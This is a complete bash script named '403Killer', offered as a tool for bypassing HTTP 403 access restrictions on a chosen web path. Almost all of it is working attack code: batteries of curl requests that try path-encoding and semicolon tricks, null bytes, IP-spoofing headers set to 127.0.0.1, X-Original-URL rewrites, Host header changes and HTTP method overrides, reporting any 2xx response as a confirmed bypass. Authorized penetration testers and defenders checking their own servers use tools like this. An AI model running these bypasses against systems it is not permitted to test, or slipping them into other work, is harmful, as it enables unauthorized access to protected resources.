#!/bin/bash

# ─────────────────────────────────────────────────────────────────────────────
#  403Killer v1.0 — Advanced HTTP 403 Bypass Tool
#  by Sopland
# ─────────────────────────────────────────────────────────────────────────────

# ── ANSI Palette ──────────────────────────────────────────────────────────────
RED='\033[0;31m'       LRED='\033[1;31m'
GREEN='\033[0;32m'     LGREEN='\033[1;32m'
YELLOW='\033[0;33m'    LYELLOW='\033[1;33m'
BLUE='\033[0;34m'      LBLUE='\033[1;34m'
PURPLE='\033[0;35m'    LPURPLE='\033[1;35m'
CYAN='\033[0;36m'      LCYAN='\033[1;36m'
WHITE='\033[1;37m'     DIM='\033[2m'          NC='\033[0m'
BOLD='\033[1m'

# 256-color fire gradient for banner
G0='\033[38;5;196m'   G1='\033[38;5;202m'   G2='\033[38;5;208m'
G3='\033[38;5;214m'   G4='\033[38;5;220m'   G5='\033[38;5;226m'

# ── Globals ────────────────────────────────────────────────────────────────────
declare -a HITS=()
declare -a AUTH_HEADERS=()     # global headers injected into every request
TOTAL=0
BASELINE_CODE=""
BASELINE_SIZE=""
TMPFILE=$(mktemp /tmp/403k_XXXXXX)
SPINNER_PID=""
SPINNER_FRAMES=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')

# ── Signal Handlers ────────────────────────────────────────────────────────────
cleanup() {
    [[ -n "$SPINNER_PID" ]] && kill "$SPINNER_PID" 2>/dev/null
    wait "$SPINNER_PID" 2>/dev/null
    rm -f "$TMPFILE"
}
trap cleanup EXIT

handle_interrupt() {
    printf "\r%-72s\r" " "
    echo
    echo -e "   ${LRED}[!] Interrupted by user.${NC}"
    exit 1
}
trap handle_interrupt INT TERM

# ── Banner ─────────────────────────────────────────────────────────────────────
banner() {
    clear
    echo
    echo -e "${G0}   ██╗  ██╗  ██████╗  ██████╗ ██╗  ██╗██╗██╗     ██╗     ███████╗██████╗ "
    echo -e "${G1}   ██║  ██║ ██╔═████╗╚════██╗ ██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗"
    echo -e "${G2}   ███████║ ██║██╔██║  █████╔╝ █████╔╝ ██║██║     ██║     █████╗  ██████╔╝"
    echo -e "${G3}   ╚════██║ ████╔╝██║  ╚═══██╗ ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗"
    echo -e "${G4}        ██║ ╚██████╔╝ ██████╔╝ ██║  ██╗██║███████╗███████╗███████╗██║  ██║"
    echo -e "${G5}        ╚═╝  ╚═════╝  ╚═════╝  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝${NC}"
    echo
    echo -e "   ${DIM}v1.0  ·  Advanced 403 Bypass Tool  ·  by ${CYAN}Sopland${NC}"
    echo -e "   ${DIM}Usage : ${CYAN}./403killer.sh${NC} ${WHITE}<URL>${NC} ${YELLOW}<path>${NC} ${DIM}[-H header] [-c cookie] [-d delay_ms]${NC}"
    echo
    echo -e "   ${DIM}──────────────────────────────────────────────────────────────────────${NC}"
    echo
}

# ── Spinner ────────────────────────────────────────────────────────────────────
start_spinner() {
    local msg="$1"
    (
        local i=0
        while true; do
            printf "\r   \033[0;36m%s\033[0m \033[2m%-58s\033[0m" \
                "${SPINNER_FRAMES[$i]}" "$msg"
            i=$(( (i + 1) % ${#SPINNER_FRAMES[@]} ))
            sleep 0.08
        done
    ) &
    SPINNER_PID=$!
}

stop_spinner() {
    if [[ -n "$SPINNER_PID" ]]; then
        kill "$SPINNER_PID" 2>/dev/null
        wait "$SPINNER_PID" 2>/dev/null
        SPINNER_PID=""
        printf "\r%-72s\r" " "
    fi
}

# ── Section Header ─────────────────────────────────────────────────────────────
section() {
    echo
    echo -e "   ${LBLUE}╔══${NC} ${WHITE}${BOLD}$*${NC} ${LBLUE}══${NC}"
    echo
}

# ── Result Printer ─────────────────────────────────────────────────────────────
print_result() {
    local code="$1" size="$2" desc="$3"
    TOTAL=$(( TOTAL + 1 ))

    local icon color diff_flag=""

    case "$code" in
        2*)              icon="✔" color="\033[1;32m" ;;
        301|302|307|308) icon="↪" color="\033[1;33m" ;;
        403)             icon="✖" color="\033[2;31m" ;;
        4*)              icon="·" color="\033[2m"    ;;
        5*)              icon="⚡" color="\033[1;35m" ;;
        *)               icon="?" color="\033[2m"    ;;
    esac

    # Flag anything that differs from the baseline
    if [[ -n "$BASELINE_CODE" && "$code" != "$BASELINE_CODE" && "$code" != "000" ]]; then
        diff_flag=" \033[1;33m◀ DIFF\033[0m"
        case "$code" in
            2*)
                diff_flag=" \033[1;32m\033[1m◀◀ BYPASS!\033[0m"
                HITS+=("${code}|${size}|${desc}")
                ;;
        esac
    fi

    printf "   \033[1m%s\033[0m ${color}[%3s]\033[0m  %6sb  \033[2m%s\033[0m%b\n" \
        "$icon" "$code" "$size" "$desc" "$diff_flag"
}

# ── Core Runner ────────────────────────────────────────────────────────────────
# Usage: check "description" [extra curl args...] <URL>
check() {
    local desc="$1"; shift

    start_spinner "$desc"
    curl -k -s -o /dev/null -L -w "%{http_code},%{size_download}" \
        "${AUTH_HEADERS[@]}" "$@" > "$TMPFILE" 2>/dev/null
    stop_spinner

    local result code size
    result=$(cat "$TMPFILE")
    code="${result%%,*}"
    size="${result##*,}"

    print_result "$code" "$size" "$desc"

    # Optional rate-limit between requests
    if [[ "${DELAY:-0}" -gt 0 ]]; then
        sleep "$(awk "BEGIN{printf \"%.3f\", ${DELAY}/1000}" 2>/dev/null || echo "0")"
    fi
}

# ── Usage ──────────────────────────────────────────────────────────────────────
usage() {
    banner
    echo -e "   ${LRED}[!]${NC} Missing required arguments."
    echo
    echo -e "   ${WHITE}Usage  :${NC}  ${CYAN}./403killer.sh${NC} ${WHITE}<URL>${NC} ${YELLOW}<path>${NC} ${DIM}[options]${NC}"
    echo
    echo -e "   ${WHITE}Options:${NC}"
    echo -e "   ${CYAN}  -H${NC} ${DIM}\"Header: value\"${NC}   Add a global header on all requests ${DIM}(repeatable)${NC}"
    echo -e "   ${CYAN}  -c${NC} ${DIM}\"name=value\"${NC}      Shorthand for Cookie header"
    echo -e "   ${CYAN}  -d${NC} ${DIM}<ms>${NC}              Delay between requests in milliseconds"
    echo
    echo -e "   ${WHITE}Examples:${NC}"
    echo -e "   ${DIM}# Anonymous${NC}"
    echo -e "   ${CYAN}  ./403killer.sh${NC} https://example.com admin"
    echo
    echo -e "   ${DIM}# Authenticated (session cookie)${NC}"
    echo -e "   ${CYAN}  ./403killer.sh${NC} https://example.com admin ${YELLOW}-c${NC} \"session=abc123def\""
    echo
    echo -e "   ${DIM}# Authenticated (JWT Bearer)${NC}"
    echo -e "   ${CYAN}  ./403killer.sh${NC} https://example.com admin ${YELLOW}-H${NC} \"Authorization: Bearer eyJ...\""
    echo
    echo -e "   ${DIM}# Multiple headers + delay${NC}"
    echo -e "   ${CYAN}  ./403killer.sh${NC} https://example.com admin ${YELLOW}-H${NC} \"Cookie: s=abc\" ${YELLOW}-H${NC} \"X-CSRF-Token: xyz\" ${YELLOW}-d${NC} 200"
    echo
    exit 1
}

# ══════════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ══════════════════════════════════════════════════════════════════════════════

banner

# ── Argument Parsing ───────────────────────────────────────────────────────────
URL=""
PATH_TARGET=""
DELAY=0

while [[ $# -gt 0 ]]; do
    case "$1" in
        -H|--header)
            [[ -z "$2" ]] && { echo -e "   ${LRED}[!]${NC} -H requires a value"; exit 1; }
            AUTH_HEADERS+=("-H" "$2")
            shift 2
            ;;
        -c|--cookie)
            [[ -z "$2" ]] && { echo -e "   ${LRED}[!]${NC} -c requires a value"; exit 1; }
            AUTH_HEADERS+=("-H" "Cookie: $2")
            shift 2
            ;;
        -d|--delay)
            [[ -z "$2" ]] && { echo -e "   ${LRED}[!]${NC} -d requires a value"; exit 1; }
            DELAY="$2"
            shift 2
            ;;
        -*)
            echo -e "   ${LRED}[!]${NC} Unknown option: $1"
            usage
            ;;
        *)
            if [[ -z "$URL" ]]; then
                URL="${1%/}"
            elif [[ -z "$PATH_TARGET" ]]; then
                PATH_TARGET="$1"
            fi
            shift
            ;;
    esac
done

[[ -z "$URL" || -z "$PATH_TARGET" ]] && usage

echo -e "   ${CYAN}Target  :${NC} ${WHITE}${URL}${NC}"
echo -e "   ${CYAN}Path    :${NC} ${YELLOW}/${PATH_TARGET}${NC}"
[[ "$DELAY" -gt 0 ]] && echo -e "   ${CYAN}Delay   :${NC} ${DIM}${DELAY}ms between requests${NC}"
# Show auth headers if any
if [[ ${#AUTH_HEADERS[@]} -gt 0 ]]; then
    echo -e "   ${CYAN}Auth    :${NC}"
    i=0
    while [[ $i -lt ${#AUTH_HEADERS[@]} ]]; do
        if [[ "${AUTH_HEADERS[$i]}" == "-H" ]]; then
            echo -e "   ${DIM}          ${LYELLOW}${AUTH_HEADERS[$((i+1))]}${NC}"
            i=$(( i + 2 ))
        else
            i=$(( i + 1 ))
        fi
    done
fi
echo

# ── Baseline ───────────────────────────────────────────────────────────────────
echo -e "   ${DIM}Establishing baseline...${NC}"
start_spinner "GET ${URL}/${PATH_TARGET}"
BASELINE_RAW=$(curl -k -s -o /dev/null -L -w "%{http_code},%{size_download}" \
    "${AUTH_HEADERS[@]}" "${URL}/${PATH_TARGET}" 2>/dev/null)
stop_spinner
BASELINE_CODE="${BASELINE_RAW%%,*}"
BASELINE_SIZE="${BASELINE_RAW##*,}"
echo -e "   ${WHITE}Baseline :${NC} ${DIM}[${BASELINE_CODE}] ${BASELINE_SIZE}b${NC}  ${DIM}— responses that differ will be flagged${NC}"

# Column header
echo
printf "   \033[2m%-4s  %-10s  %s\033[0m\n" "CODE" "SIZE" "TECHNIQUE"
echo -e "   ${DIM}──────────────────────────────────────────────────────────────────${NC}"


# ══════════════════════════════════════════════════════════════════════════════
# 1 · PATH MANIPULATION
# ══════════════════════════════════════════════════════════════════════════════
section "1 · PATH MANIPULATION"

# Basic dot/slash tricks
check "/${PATH_TARGET}/"                   "${URL}/${PATH_TARGET}/"
check "/${PATH_TARGET}/."                  "${URL}/${PATH_TARGET}/."
check "//${PATH_TARGET}//"                 "${URL}//${PATH_TARGET}//"
check "/./${PATH_TARGET}/./"               "${URL}/./${PATH_TARGET}/./"
check "/%2e/${PATH_TARGET}"                "${URL}/%2e/${PATH_TARGET}"

# Semicolon tricks — Spring / Tomcat / Nginx
check "/;/${PATH_TARGET}"                  "${URL}/;/${PATH_TARGET}"
check "/${PATH_TARGET};/"                  "${URL}/${PATH_TARGET};/"
check "/${PATH_TARGET}..;/"                "${URL}/${PATH_TARGET}..;/"
check "/${PATH_TARGET};.js"                "${URL}/${PATH_TARGET};.js"
check "/${PATH_TARGET};anything"           "${URL}/${PATH_TARGET};anything"
check "/${PATH_TARGET};%09"                "${URL}/${PATH_TARGET};%09"

# Double URL encoding
check "/%252e/${PATH_TARGET}"              "${URL}/%252e/${PATH_TARGET}"
check "/${PATH_TARGET}%252f"               "${URL}/${PATH_TARGET}%252f"
check "/%2f${PATH_TARGET}"                "${URL}/%2f${PATH_TARGET}"

# Overlong UTF-8 (legacy parser bypass)
check "/%c0%af${PATH_TARGET}"              "${URL}/%c0%af${PATH_TARGET}"
check "/%ef%bc%8f${PATH_TARGET}"           "${URL}/%ef%bc%8f${PATH_TARGET}"

# Encoded chars appended
check "/${PATH_TARGET}%20"                 "${URL}/${PATH_TARGET}%20"
check "/${PATH_TARGET}%09"                 "${URL}/${PATH_TARGET}%09"
check "/${PATH_TARGET}%00"                 "${URL}/${PATH_TARGET}%00"
check "/${PATH_TARGET}%00.html"            "${URL}/${PATH_TARGET}%00.html"
check "/${PATH_TARGET}?"                   "${URL}/${PATH_TARGET}?"
check "/${PATH_TARGET}#"                   "${URL}/${PATH_TARGET}#"
check "/${PATH_TARGET}/*"                  "${URL}/${PATH_TARGET}/*"

# Query string tricks
check "/${PATH_TARGET}/?anything"          "${URL}/${PATH_TARGET}/?anything"
check "/${PATH_TARGET}?id=1"               "${URL}/${PATH_TARGET}?id=1"

# Extension spoofing
check "/${PATH_TARGET}.html"               "${URL}/${PATH_TARGET}.html"
check "/${PATH_TARGET}.php"                "${URL}/${PATH_TARGET}.php"
check "/${PATH_TARGET}.json"               "${URL}/${PATH_TARGET}.json"
check "/${PATH_TARGET}.asp"                "${URL}/${PATH_TARGET}.asp"
check "/${PATH_TARGET}.aspx"               "${URL}/${PATH_TARGET}.aspx"

# IIS-specific
check "/${PATH_TARGET}::DATA (IIS ADS)"    "${URL}/${PATH_TARGET}::DATA"
check "/${PATH_TARGET}~ (IIS short name)"  "${URL}/${PATH_TARGET}~"

# Case swap (case-insensitive backends)
PATH_UPPER=$(echo "${PATH_TARGET}" | tr '[:lower:]' '[:upper:]')
[[ "$PATH_UPPER" != "$PATH_TARGET" ]] && \
    check "/${PATH_UPPER} (uppercase)"     "${URL}/${PATH_UPPER}"


# ══════════════════════════════════════════════════════════════════════════════
# 2 · IP SPOOFING HEADERS
# ══════════════════════════════════════════════════════════════════════════════
section "2 · IP SPOOFING HEADERS"

check "X-Forwarded-For: 127.0.0.1"            -H "X-Forwarded-For: 127.0.0.1"            "${URL}/${PATH_TARGET}"
check "X-Forwarded-For: 127.0.0.1:80"         -H "X-Forwarded-For: 127.0.0.1:80"         "${URL}/${PATH_TARGET}"
check "X-Forwarded-For: http://127.0.0.1"      -H "X-Forwarded-For: http://127.0.0.1"      "${URL}/${PATH_TARGET}"
check "X-Real-IP: 127.0.0.1"                  -H "X-Real-IP: 127.0.0.1"                  "${URL}/${PATH_TARGET}"
check "X-Client-IP: 127.0.0.1"                -H "X-Client-IP: 127.0.0.1"                "${URL}/${PATH_TARGET}"
check "X-Custom-IP-Authorization: 127.0.0.1"  -H "X-Custom-IP-Authorization: 127.0.0.1"  "${URL}/${PATH_TARGET}"
check "True-Client-IP: 127.0.0.1"             -H "True-Client-IP: 127.0.0.1"             "${URL}/${PATH_TARGET}"
check "Client-IP: 127.0.0.1"                  -H "Client-IP: 127.0.0.1"                  "${URL}/${PATH_TARGET}"
check "Forwarded: for=127.0.0.1"              -H "Forwarded: for=127.0.0.1"              "${URL}/${PATH_TARGET}"
check "X-Originating-IP: 127.0.0.1"           -H "X-Originating-IP: 127.0.0.1"           "${URL}/${PATH_TARGET}"
check "X-Remote-IP: 127.0.0.1"                -H "X-Remote-IP: 127.0.0.1"                "${URL}/${PATH_TARGET}"
check "X-Remote-Addr: 127.0.0.1"              -H "X-Remote-Addr: 127.0.0.1"              "${URL}/${PATH_TARGET}"
check "X-Cluster-Client-IP: 127.0.0.1"        -H "X-Cluster-Client-IP: 127.0.0.1"        "${URL}/${PATH_TARGET}"
check "CF-Connecting-IP: 127.0.0.1"           -H "CF-Connecting-IP: 127.0.0.1"           "${URL}/${PATH_TARGET}"
check "X-ProxyUser-Ip: 127.0.0.1"             -H "X-ProxyUser-Ip: 127.0.0.1"             "${URL}/${PATH_TARGET}"
check "Referer: http://127.0.0.1/"            -H "Referer: http://127.0.0.1/"            "${URL}/${PATH_TARGET}"
# Triple-header combo
check "X-Forwarded-For + X-Real-IP + X-Client-IP (combo)" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    -H "X-Client-IP: 127.0.0.1" \
    "${URL}/${PATH_TARGET}"


# ══════════════════════════════════════════════════════════════════════════════
# 3 · URL REWRITE HEADERS
# ══════════════════════════════════════════════════════════════════════════════
section "3 · URL REWRITE HEADERS"

check "X-Original-URL: /${PATH_TARGET}"          -H "X-Original-URL: /${PATH_TARGET}"     "${URL}"
check "X-Rewrite-URL: /${PATH_TARGET}"           -H "X-Rewrite-URL: /${PATH_TARGET}"      "${URL}"
check "X-Override-URL: /${PATH_TARGET}"          -H "X-Override-URL: /${PATH_TARGET}"     "${URL}"
check "X-Original-URL: /${PATH_TARGET} (on path)" -H "X-Original-URL: /${PATH_TARGET}"    "${URL}/${PATH_TARGET}"


# ══════════════════════════════════════════════════════════════════════════════
# 4 · HOST HEADER MANIPULATION
# ══════════════════════════════════════════════════════════════════════════════
section "4 · HOST HEADER MANIPULATION"

check "Host: localhost"                     -H "Host: localhost"                  "${URL}/${PATH_TARGET}"
check "Host: 127.0.0.1"                     -H "Host: 127.0.0.1"                  "${URL}/${PATH_TARGET}"
check "Host: 0.0.0.0"                       -H "Host: 0.0.0.0"                    "${URL}/${PATH_TARGET}"
check "X-Forwarded-Host: 127.0.0.1"         -H "X-Forwarded-Host: 127.0.0.1"     "${URL}/${PATH_TARGET}"
check "X-Host: 127.0.0.1"                   -H "X-Host: 127.0.0.1"               "${URL}/${PATH_TARGET}"
check "X-Forwarded-Proto: https"            -H "X-Forwarded-Proto: https"        "${URL}/${PATH_TARGET}"
check "X-Forwarded-Proto: http"             -H "X-Forwarded-Proto: http"         "${URL}/${PATH_TARGET}"


# ══════════════════════════════════════════════════════════════════════════════
# 5 · HTTP METHOD OVERRIDE
# ══════════════════════════════════════════════════════════════════════════════
section "5 · HTTP METHOD OVERRIDE"

check "HEAD"                                -X HEAD                                    "${URL}/${PATH_TARGET}"
check "OPTIONS"                             -X OPTIONS                                 "${URL}/${PATH_TARGET}"
check "TRACE"                               -X TRACE                                   "${URL}/${PATH_TARGET}"
check "POST (Content-Length: 0)"            -X POST   -H "Content-Length: 0"           "${URL}/${PATH_TARGET}"
check "PUT (empty body)"                    -X PUT    -H "Content-Length: 0"           "${URL}/${PATH_TARGET}"
check "PATCH (empty body)"                  -X PATCH  -H "Content-Length: 0"           "${URL}/${PATH_TARGET}"
check "DELETE"                              -X DELETE -H "Content-Length: 0"           "${URL}/${PATH_TARGET}"
check "POST + X-HTTP-Method-Override: GET"  -X POST   -H "X-HTTP-Method-Override: GET" "${URL}/${PATH_TARGET}"
check "POST + X-Method-Override: GET"       -X POST   -H "X-Method-Override: GET"      "${URL}/${PATH_TARGET}"
check "POST + X-HTTP-Method: GET"           -X POST   -H "X-HTTP-Method: GET"          "${URL}/${PATH_TARGET}"
check "HTTP/1.0 downgrade"                  --http1.0                                  "${URL}/${PATH_TARGET}"
# Method + IP header combo
check "POST + Override + X-Forwarded-For (combo)" \
    -X POST \
    -H "Content-Length: 0" \
    -H "X-HTTP-Method-Override: GET" \
    -H "X-Forwarded-For: 127.0.0.1" \
    "${URL}/${PATH_TARGET}"


# ══════════════════════════════════════════════════════════════════════════════
# 6 · WAYBACK MACHINE
# ══════════════════════════════════════════════════════════════════════════════
section "6 · WAYBACK MACHINE"

printf "   ${DIM}Querying archive.org...${NC} "
WB=$(curl -s --max-time 10 \
    "https://archive.org/wayback/available?url=${URL}/${PATH_TARGET}" 2>/dev/null \
    | grep -o '"url":"[^"]*"' | head -1 | cut -d'"' -f4)

if [[ -n "$WB" ]]; then
    echo -e "${LGREEN}[FOUND]${NC}"
    echo -e "   ${WHITE}↪  ${WB}${NC}"
    HITS+=("WB|0|Wayback: ${WB}")
else
    echo -e "${DIM}[not found]${NC}"
fi


# ══════════════════════════════════════════════════════════════════════════════
# SUMMARY
# ══════════════════════════════════════════════════════════════════════════════
echo
echo -e "   ${DIM}──────────────────────────────────────────────────────────────────${NC}"
echo -e "   ${BOLD}${WHITE}SUMMARY${NC}  ${DIM}(${TOTAL} techniques tested · baseline: [${BASELINE_CODE}] ${BASELINE_SIZE}b)${NC}"
echo

# Separate HTTP hits from Wayback hits
HTTP_HITS=()
WB_HITS=()
for hit in "${HITS[@]}"; do
    if [[ "$hit" == WB\|* ]]; then
        WB_HITS+=("$hit")
    else
        HTTP_HITS+=("$hit")
    fi
done

if [[ ${#HTTP_HITS[@]} -eq 0 && ${#WB_HITS[@]} -eq 0 ]]; then
    echo -e "   ${DIM}No confirmed bypasses found.${NC}"
    echo -e "   ${DIM}Tips: try authenticated paths, custom User-Agent, Content-Type spoofing,${NC}"
    echo -e "   ${DIM}or combine techniques manually (e.g. path mangling + IP header).${NC}"
else
    if [[ ${#HTTP_HITS[@]} -gt 0 ]]; then
        echo -e "   ${LGREEN}${BOLD}[!] ${#HTTP_HITS[@]} HTTP bypass(es) confirmed:${NC}"
        echo
        for hit in "${HTTP_HITS[@]}"; do
            IFS='|' read -r code size desc <<< "$hit"
            echo -e "   ${LGREEN}✔${NC}  ${WHITE}[${code}]${NC}  ${LYELLOW}${desc}${NC}  ${DIM}(${size}b)${NC}"
        done
    fi
    if [[ ${#WB_HITS[@]} -gt 0 ]]; then
        echo
        echo -e "   ${LCYAN}[i] Archived version(s) found in Wayback Machine — check hits above.${NC}"
    fi
fi

echo
echo -e "   ${DIM}──────────────────────────────────────────────────────────────────${NC}"
echo
